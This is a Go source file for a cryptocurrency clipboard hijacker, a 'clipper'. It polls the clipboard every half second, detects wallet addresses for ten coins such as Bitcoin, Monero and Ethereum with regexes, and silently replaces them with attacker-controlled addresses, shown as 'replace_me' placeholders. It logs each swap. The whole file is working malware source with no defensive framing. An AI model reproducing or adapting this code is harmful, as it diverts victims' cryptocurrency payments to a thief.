package main

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
)

func main() {
	fmt.Println("Now watching clipboard for addresses... ")
	for {
		now := time.Now()
		current_time := now.Format("2006/01/02 15:04:05")
		time.Sleep(500 * time.Millisecond)
		user_clipboard, _ := clipboard.ReadAll()
		crypto_found := sniff(user_clipboard)
		replacement_address := replace(user_clipboard, crypto_found)

		if replacement_address != "" {
			log(current_time, crypto_found, user_clipboard, replacement_address)
		}
	}
}

func replace(user_clipboard string, crypto_found string) string {
	master_addresses := map[string]string{
		"btc":  "replace_me_btc",
		"xmr":  "replace_me_xmr",
		"eth":  "replace_me_eth",
		"dash": "replace_me_dash",
		"xrp":  "replace_me_xrp",
		"doge": "replace_me_doge",
		"ada":  "replace_me_ada",
		"lite": "replace_me_lite",
		"dot":  "replace_me_dot",
		"tron": "replace_me_tron",
	}

	if crypto_found != "" && master_addresses[crypto_found] != "" {
		clipboard.WriteAll(master_addresses[crypto_found])
		return master_addresses[crypto_found]
	}
	return ""
}

func sniff(user_clipboard string) string {
	crypto_regex_match := map[string]string{
		"btc":  "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
		"xmr":  "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
		"eth":  "^0x[a-fA-F0-9]{40}$",
		"dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
		"xrp":  "^r[0-9a-zA-Z]{24,34}$",
		"doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
		"ada":  "^D[A-NP-Za-km-z1-9]{35,}$",
		"lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
		"tron": "^T[a-zA-Z0-9]{33}$",
		"dot":  "^[1-9A-HJ-NP-Za-km-z]*$",
	}

	for k, v := range crypto_regex_match {
		match, _ := regexp.MatchString(v, user_clipboard)
		if match {
			return k
		}
	}

	return ""
}

func log(current_time string, crypto_found string, user_clipboard string, replacement_address string) {
	if crypto_found != "" {
		fmt.Printf("[%s] %s in clipboard (%s) replacing with -> %s\n", current_time, strings.ToUpper(crypto_found), user_clipboard, replacement_address)
	}
}
